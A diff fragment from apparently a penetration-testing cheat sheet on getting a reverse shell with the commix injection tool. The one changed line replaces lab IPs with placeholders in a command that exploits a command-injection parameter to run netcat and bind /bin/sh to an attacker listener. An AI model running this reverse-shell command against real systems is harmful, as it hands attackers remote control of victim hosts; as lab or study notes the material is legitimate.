@@ -3,7 +3,7 @@ Commix Reverse Shell
 Technique 1
 -----------
 ```bash
-commix -u 'http://10.5.21.4/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh 10.5.21.22 1234"
+commix -u 'http://victim.ip.address/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh attacker.ip.adddress 1234"
 ```
 
 Technique 2
